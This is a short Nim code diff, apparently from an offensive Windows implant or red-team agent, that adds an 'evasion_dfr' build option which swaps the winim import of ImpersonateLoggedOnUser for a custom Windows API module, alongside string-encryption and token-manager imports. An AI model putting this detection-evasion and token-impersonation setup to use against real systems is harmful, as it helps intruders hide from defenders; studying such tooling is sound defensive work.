@@ -4,7 +4,11 @@ import ../utils/strenc
 import std/[json, strformat, strutils]
 
 when defined(windows):
-  import winim/lean
+  when defined(evasion_dfr):
+    import winim/lean except ImpersonateLoggedOnUser
+    import ../utils/winapi
+  else:
+    import winim/lean
   import token_manager
   
   {.push used.}
